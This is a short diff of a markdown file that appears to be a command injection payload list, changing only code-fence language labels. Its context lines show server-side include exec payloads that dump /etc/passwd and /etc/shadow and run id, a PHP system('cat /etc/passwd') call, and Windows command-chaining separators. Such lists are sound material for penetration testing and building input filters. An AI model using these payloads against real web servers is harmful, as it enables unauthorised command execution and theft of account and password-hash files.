@@ -1,7 +1,7 @@
 # Command injection payloads
 
 **UNIX**
-```
+```bash
 &lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;
 &lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;
 &lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
@@ -108,7 +108,7 @@ system('cat /etc/passwd');
 
 **Windows**
 
-```
+```batch
 `
 || 
 | 
